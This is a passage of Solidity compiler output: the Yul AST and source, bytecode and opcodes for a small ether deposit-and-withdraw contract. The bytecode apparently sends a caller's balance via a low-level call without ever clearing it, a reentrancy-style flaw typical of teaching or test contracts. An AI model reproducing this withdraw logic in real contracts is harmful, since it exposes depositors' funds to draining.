,{"kind":"number","nodeType":"YulLiteral","src":"714:2:15","type":"","value":"21"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"650:58:15"},"nodeType":"YulFunctionCall","src":"650:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"643:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"815:3:15"}],"functionName":{"name":"store_literal_in_memory_224cc15859f3bc8990d4f8746fb4f9ad5ccdbcb7ca20356ee2a5fabd0dec216c","nodeType":"YulIdentifier","src":"726:88:15"},"nodeType":"YulFunctionCall","src":"726:93:15"},"nodeType":"YulExpressionStatement","src":"726:93:15"},{"nodeType":"YulAssignment","src":"828:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"839:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"844:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"835:3:15"},"nodeType":"YulFunctionCall","src":"835:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"828:3:15"}]}]},"name":"abi_encode_t_stringliteral_224cc15859f3bc8990d4f8746fb4f9ad5ccdbcb7ca20356ee2a5fabd0dec216c_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"621:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"629:3:15","type":""}],"src":"487:366:15"},{"body":{"nodeType":"YulBlock","src":"1022:235:15","statements":[{"nodeType":"YulAssignment","src":"1032:90:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"1115:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"1120:1:15","type":"","value":"0"}],"functionName":{"name":"array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack","nodeType":"YulIdentifier","src":"1039:75:15"},"nodeType":"YulFunctionCall","src":"1039:83:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"1032:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"1220:3:15"}],"functionName":{"name":"store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470","nodeType":"YulIdentifier","src":"1131:88:15"},"nodeType":"YulFunctionCall","src":"1131:93:15"},"nodeType":"YulExpressionStatement","src":"1131:93:15"},{"nodeType":"YulAssignment","src":"1233:18:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"1244:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"1249:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"1240:3:15"},"nodeType":"YulFunctionCall","src":"1240:11:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"1233:3:15"}]}]},"name":"abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"1010:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"1018:3:15","type":""}],"src":"859:398:15"},{"body":{"nodeType":"YulBlock","src":"1328:53:15","statements":[{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"1345:3:15"},{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"1368:5:15"}],"functionName":{"name":"cleanup_t_uint256","nodeType":"YulIdentifier","src":"1350:17:15"},"nodeType":"YulFunctionCall","src":"1350:24:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"1338:6:15"},"nodeType":"YulFunctionCall","src":"1338:37:15"},"nodeType":"YulExpressionStatement","src":"1338:37:15"}]},"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"1316:5:15","type":""},{"name":"pos","nodeType":"YulTypedName","src":"1323:3:15","type":""}],"src":"1263:118:15"},{"body":{"nodeType":"YulBlock","src":"1575:191:15","statements":[{"nodeType":"YulAssignment","src":"1586:154:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"1736:3:15"}],"functionName":{"name":"abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack","nodeType":"YulIdentifier","src":"1593:141:15"},"nodeType":"YulFunctionCall","src":"1593:147:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"1586:3:15"}]},{"nodeType":"YulAssignment","src":"1750:10:15","value":{"name":"pos","nodeType":"YulIdentifier","src":"1757:3:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"1750:3:15"}]}]},"name":"abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"1562:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"1571:3:15","type":""}],"src":"1387:379:15"},{"body":{"nodeType":"YulBlock","src":"1943:248:15","statements":[{"nodeType":"YulAssignment","src":"1953:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"1965:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"1976:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"1961:3:15"},"nodeType":"YulFunctionCall","src":"1961:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"1953:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"2000:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"2011:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"1996:3:15"},"nodeType":"YulFunctionCall","src":"1996:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"2019:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"2025:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"2015:3:15"},"nodeType":"YulFunctionCall","src":"2015:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"1989:6:15"},"nodeType":"YulFunctionCall","src":"1989:47:15"},"nodeType":"YulExpressionStatement","src":"1989:47:15"},{"nodeType":"YulAssignment","src":"2045:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"2179:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_224cc15859f3bc8990d4f8746fb4f9ad5ccdbcb7ca20356ee2a5fabd0dec216c_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"2053:124:15"},"nodeType":"YulFunctionCall","src":"2053:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"2045:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_224cc15859f3bc8990d4f8746fb4f9ad5ccdbcb7ca20356ee2a5fabd0dec216c__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"1923:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"1938:4:15","type":""}],"src":"1772:419:15"},{"body":{"nodeType":"YulBlock","src":"2295:124:15","statements":[{"nodeType":"YulAssignment","src":"2305:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"2317:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"2328:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"2313:3:15"},"nodeType":"YulFunctionCall","src":"2313:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"2305:4:15"}]},{"expression":{"arguments":[{"name":"value0","nodeType":"YulIdentifier","src":"2385:6:15"},{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"2398:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"2409:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"2394:3:15"},"nodeType":"YulFunctionCall","src":"2394:17:15"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nodeType":"YulIdentifier","src":"2341:43:15"},"nodeType":"YulFunctionCall","src":"2341:71:15"},"nodeType":"YulExpressionStatement","src":"2341:71:15"}]},"name":"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"2267:9:15","type":""},{"name":"value0","nodeType":"YulTypedName","src":"2279:6:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"2290:4:15","type":""}],"src":"2197:222:15"},{"body":{"nodeType":"YulBlock","src":"2465:35:15","statements":[{"nodeType":"YulAssignment","src":"2475:19:15","value":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"2491:2:15","type":"","value":"64"}],"functionName":{"name":"mload","nodeType":"YulIdentifier","src":"2485:5:15"},"nodeType":"YulFunctionCall","src":"2485:9:15"},"variableNames":[{"name":"memPtr","nodeType":"YulIdentifier","src":"2475:6:15"}]}]},"name":"allocate_unbounded","nodeType":"YulFunctionDefinition","returnVariables":[{"name":"memPtr","nodeType":"YulTypedName","src":"2458:6:15","type":""}],"src":"2425:75:15"},{"body":{"nodeType":"YulBlock","src":"2619:34:15","statements":[{"nodeType":"YulAssignment","src":"2629:18:15","value":{"name":"pos","nodeType":"YulIdentifier","src":"2644:3:15"},"variableNames":[{"name":"updated_pos","nodeType":"YulIdentifier","src":"2629:11:15"}]}]},"name":"array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"2591:3:15","type":""},{"name":"length","nodeType":"YulTypedName","src":"2596:6:15","type":""}],"returnVariables":[{"name":"updated_pos","nodeType":"YulTypedName","src":"2607:11:15","type":""}],"src":"2506:147:15"},{"body":{"nodeType":"YulBlock","src":"2755:73:15","statements":[{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"2772:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"2777:6:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"2765:6:15"},"nodeType":"YulFunctionCall","src":"2765:19:15"},"nodeType":"YulExpressionStatement","src":"2765:19:15"},{"nodeType":"YulAssignment","src":"2793:29:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"2812:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"2817:4:15","type":"","value":"0x20"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"2808:3:15"},"nodeType":"YulFunctionCall","src":"2808:14:15"},"variableNames":[{"name":"updated_pos","nodeType":"YulIdentifier","src":"2793:11:15"}]}]},"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"2727:3:15","type":""},{"name":"length","nodeType":"YulTypedName","src":"2732:6:15","type":""}],"returnVariables":[{"name":"updated_pos","nodeType":"YulTypedName","src":"2743:11:15","type":""}],"src":"2659:169:15"},{"body":{"nodeType":"YulBlock","src":"2878:261:15","statements":[{"nodeType":"YulAssignment","src":"2888:25:15","value":{"arguments":[{"name":"x","nodeType":"YulIdentifier","src":"2911:1:15"}],"functionName":{"name":"cleanup_t_uint256","nodeType":"YulIdentifier","src":"2893:17:15"},"nodeType":"YulFunctionCall","src":"2893:20:15"},"variableNames":[{"name":"x","nodeType":"YulIdentifier","src":"2888:1:15"}]},{"nodeType":"YulAssignment","src":"2922:25:15","value":{"arguments":[{"name":"y","nodeType":"YulIdentifier","src":"2945:1:15"}],"functionName":{"name":"cleanup_t_uint256","nodeType":"YulIdentifier","src":"2927:17:15"},"nodeType":"YulFunctionCall","src":"2927:20:15"},"variableNames":[{"name":"y","nodeType":"YulIdentifier","src":"2922:1:15"}]},{"body":{"nodeType":"YulBlock","src":"3085:22:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x11","nodeType":"YulIdentifier","src":"3087:16:15"},"nodeType":"YulFunctionCall","src":"3087:18:15"},"nodeType":"YulExpressionStatement","src":"3087:18:15"}]},"condition":{"arguments":[{"name":"x","nodeType":"YulIdentifier","src":"3006:1:15"},{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"3013:66:15","type":"","value":"0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"},{"name":"y","nodeType":"YulIdentifier","src":"3081:1:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"3009:3:15"},"nodeType":"YulFunctionCall","src":"3009:74:15"}],"functionName":{"name":"gt","nodeType":"YulIdentifier","src":"3003:2:15"},"nodeType":"YulFunctionCall","src":"3003:81:15"},"nodeType":"YulIf","src":"3000:107:15"},{"nodeType":"YulAssignment","src":"3117:16:15","value":{"arguments":[{"name":"x","nodeType":"YulIdentifier","src":"3128:1:15"},{"name":"y","nodeType":"YulIdentifier","src":"3131:1:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"3124:3:15"},"nodeType":"YulFunctionCall","src":"3124:9:15"},"variableNames":[{"name":"sum","nodeType":"YulIdentifier","src":"3117:3:15"}]}]},"name":"checked_add_t_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"x","nodeType":"YulTypedName","src":"2865:1:15","type":""},{"name":"y","nodeType":"YulTypedName","src":"2868:1:15","type":""}],"returnVariables":[{"name":"sum","nodeType":"YulTypedName","src":"2874:3:15","type":""}],"src":"2834:305:15"},{"body":{"nodeType":"YulBlock","src":"3190:51:15","statements":[{"nodeType":"YulAssignment","src":"3200:35:15","value":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"3229:5:15"}],"functionName":{"name":"cleanup_t_uint160","nodeType":"YulIdentifier","src":"3211:17:15"},"nodeType":"YulFunctionCall","src":"3211:24:15"},"variableNames":[{"name":"cleaned","nodeType":"YulIdentifier","src":"3200:7:15"}]}]},"name":"cleanup_t_address","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"3172:5:15","type":""}],"returnVariables":[{"name":"cleaned","nodeType":"YulTypedName","src":"3182:7:15","type":""}],"src":"3145:96:15"},{"body":{"nodeType":"YulBlock","src":"3292:81:15","statements":[{"nodeType":"YulAssignment","src":"3302:65:15","value":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"3317:5:15"},{"kind":"number","nodeType":"YulLiteral","src":"3324:42:15","type":"","value":"0xffffffffffffffffffffffffffffffffffffffff"}],"functionName":{"name":"and","nodeType":"YulIdentifier","src":"3313:3:15"},"nodeType":"YulFunctionCall","src":"3313:54:15"},"variableNames":[{"name":"cleaned","nodeType":"YulIdentifier","src":"3302:7:15"}]}]},"name":"cleanup_t_uint160","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"3274:5:15","type":""}],"returnVariables":[{"name":"cleaned","nodeType":"YulTypedName","src":"3284:7:15","type":""}],"src":"3247:126:15"},{"body":{"nodeType":"YulBlock","src":"3424:32:15","statements":[{"nodeType":"YulAssignment","src":"3434:16:15","value":{"name":"value","nodeType":"YulIdentifier","src":"3445:5:15"},"variableNames":[{"name":"cleaned","nodeType":"YulIdentifier","src":"3434:7:15"}]}]},"name":"cleanup_t_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"3406:5:15","type":""}],"returnVariables":[{"name":"cleaned","nodeType":"YulTypedName","src":"3416:7:15","type":""}],"src":"3379:77:15"},{"body":{"nodeType":"YulBlock","src":"3490:152:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"3507:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"3510:77:15","type":"","value":"35408467139433450592217433187231851964531694900788300625387963629091585785856"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"3500:6:15"},"nodeType":"YulFunctionCall","src":"3500:88:15"},"nodeType":"YulExpressionStatement","src":"3500:88:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"3604:1:15","type":"","value":"4"},{"kind":"number","nodeType":"YulLiteral","src":"3607:4:15","type":"","value":"0x11"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"3597:6:15"},"nodeType":"YulFunctionCall","src":"3597:15:15"},"nodeType":"YulExpressionStatement","src":"3597:15:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"3628:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"3631:4:15","type":"","value":"0x24"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"3621:6:15"},"nodeType":"YulFunctionCall","src":"3621:15:15"},"nodeType":"YulExpressionStatement","src":"3621:15:15"}]},"name":"panic_error_0x11","nodeType":"YulFunctionDefinition","src":"3462:180:15"},{"body":{"nodeType":"YulBlock","src":"3737:28:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"3754:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"3757:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"3747:6:15"},"nodeType":"YulFunctionCall","src":"3747:12:15"},"nodeType":"YulExpressionStatement","src":"3747:12:15"}]},"name":"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db","nodeType":"YulFunctionDefinition","src":"3648:117:15"},{"body":{"nodeType":"YulBlock","src":"3860:28:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"3877:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"3880:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"3870:6:15"},"nodeType":"YulFunctionCall","src":"3870:12:15"},"nodeType":"YulExpressionStatement","src":"3870:12:15"}]},"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulFunctionDefinition","src":"3771:117:15"},{"body":{"nodeType":"YulBlock","src":"4000:65:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"4022:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"4030:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"4018:3:15"},"nodeType":"YulFunctionCall","src":"4018:14:15"},{"hexValue":"4661696c656420746f2073656e6420657468657220","kind":"string","nodeType":"YulLiteral","src":"4034:23:15","type":"","value":"Failed to send ether "}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"4011:6:15"},"nodeType":"YulFunctionCall","src":"4011:47:15"},"nodeType":"YulExpressionStatement","src":"4011:47:15"}]},"name":"store_literal_in_memory_224cc15859f3bc8990d4f8746fb4f9ad5ccdbcb7ca20356ee2a5fabd0dec216c","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"3992:6:15","type":""}],"src":"3894:171:15"},{"body":{"nodeType":"YulBlock","src":"4177:8:15","statements":[]},"name":"store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"4169:6:15","type":""}],"src":"4071:114:15"},{"body":{"nodeType":"YulBlock","src":"4234:79:15","statements":[{"body":{"nodeType":"YulBlock","src":"4291:16:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"4300:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"4303:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"4293:6:15"},"nodeType":"YulFunctionCall","src":"4293:12:15"},"nodeType":"YulExpressionStatement","src":"4293:12:15"}]},"condition":{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"4257:5:15"},{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"4282:5:15"}],"functionName":{"name":"cleanup_t_address","nodeType":"YulIdentifier","src":"4264:17:15"},"nodeType":"YulFunctionCall","src":"4264:24:15"}],"functionName":{"name":"eq","nodeType":"YulIdentifier","src":"4254:2:15"},"nodeType":"YulFunctionCall","src":"4254:35:15"}],"functionName":{"name":"iszero","nodeType":"YulIdentifier","src":"4247:6:15"},"nodeType":"YulFunctionCall","src":"4247:43:15"},"nodeType":"YulIf","src":"4244:63:15"}]},"name":"validator_revert_t_address","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"4227:5:15","type":""}],"src":"4191:122:15"}]},"contents":"{\n\n    function abi_decode_t_address(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_address(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_stringliteral_224cc15859f3bc8990d4f8746fb4f9ad5ccdbcb7ca20356ee2a5fabd0dec216c_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 21)\n        store_literal_in_memory_224cc15859f3bc8990d4f8746fb4f9ad5ccdbcb7ca20356ee2a5fabd0dec216c(pos)\n        end := add(pos, 32)\n    }\n\n    function abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, 0)\n        store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470(pos)\n        end := add(pos, 0)\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed(pos ) -> end {\n\n        pos := abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack( pos)\n\n        end := pos\n    }\n\n    function abi_encode_tuple_t_stringliteral_224cc15859f3bc8990d4f8746fb4f9ad5ccdbcb7ca20356ee2a5fabd0dec216c__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_224cc15859f3bc8990d4f8746fb4f9ad5ccdbcb7ca20356ee2a5fabd0dec216c_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, length) -> updated_pos {\n        updated_pos := pos\n    }\n\n    function array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, length) -> updated_pos {\n        mstore(pos, length)\n        updated_pos := add(pos, 0x20)\n    }\n\n    function checked_add_t_uint256(x, y) -> sum {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n\n        // overflow, if x > (maxValue - y)\n        if gt(x, sub(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff, y)) { panic_error_0x11() }\n\n        sum := add(x, y)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function panic_error_0x11() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x11)\n        revert(0, 0x24)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function store_literal_in_memory_224cc15859f3bc8990d4f8746fb4f9ad5ccdbcb7ca20356ee2a5fabd0dec216c(memPtr) {\n\n        mstore(add(memPtr, 0), \"Failed to send ether \")\n\n    }\n\n    function store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470(memPtr) {\n\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n}\n","id":15,"language":"Yul","name":"#utility.yul"}],"immutableReferences":{},"linkReferences":{},"object":"60806040526004361061003f5760003560e01c806312065fe01461004457806327e235e31461006f5780633ccfd60b146100ac578063d0e30db0146100c3575b600080fd5b34801561005057600080fd5b506100596100cd565b6040516100669190610310565b60405180910390f35b34801561007b57600080fd5b5061009660048036038101906100919190610259565b6100d5565b6040516100a39190610310565b60405180910390f35b3480156100b857600080fd5b506100c16100ed565b005b6100cb6101ed565b005b600047905090565b60006020528060005260406000206000915090505481565b60008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205490506000811161013d57600080fd5b60003373ffffffffffffffffffffffffffffffffffffffff1682604051610163906102db565b60006040518083038185875af1925050503d80600081146101a0576040519150601f19603f3d011682016040523d82523d6000602084013e6101a5565b606091505b50509050806101e9576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101e0906102f0565b60405180910390fd5b5050565b346000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825461023b9190610347565b92505081905550565b60008135905061025381610439565b92915050565b60006020828403121561026f5761026e610408565b5b600061027d84828501610244565b91505092915050565b6000610293601583610336565b915061029e8261040d565b602082019050919050565b60006102b660008361032b565b91506102c182610436565b600082019050919050565b6102d5816103cf565b82525050565b60006102e6826102a9565b9150819050919050565b6000602082019050818103600083015261030981610286565b9050919050565b600060208201905061032560008301846102cc565b92915050565b600081905092915050565b600082825260208201905092915050565b6000610352826103cf565b915061035d836103cf565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff03821115610392576103916103d9565b5b828201905092915050565b60006103a8826103af565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600080fd5b7f4661696c656420746f2073656e64206574686572200000000000000000000000600082015250565b50565b6104428161039d565b811461044d57600080fd5b5056fea264697066735822122053fef57e5312456af446ce256f26830c4e6abb69b9173533de926402bc8f9c3b64736f6c63430008070033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x3F JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x12065FE0 EQ PUSH2 0x44 JUMPI DUP1 PUSH4 0x27E235E3 EQ PUSH2 0x6F JUMPI DUP1 PUSH4 0x3CCFD60B EQ PUSH2 0xAC JUMPI DUP1 PUSH4 0xD0E30DB0 EQ PUSH2 0xC3 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x50 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x59 PUSH2 0xCD JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x66 SWAP2 SWAP1 PUSH2 0x310 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x7B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x96 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x91 SWAP2 SWAP1 PUSH2 0x259 JUMP JUMPDEST PUSH2 0xD5 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xA3 SWAP2 SWAP1 PUSH2 0x310 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xB8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xC1 PUSH2 0xED JUMP JUMPDEST STOP JUMPDEST PUSH2 0xCB PUSH2 0x1ED JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 MSTORE DUP1 PUSH1 0x0 MSTORE PUSH1 0x40 PUSH1 0x0 KECCAK256 PUSH1 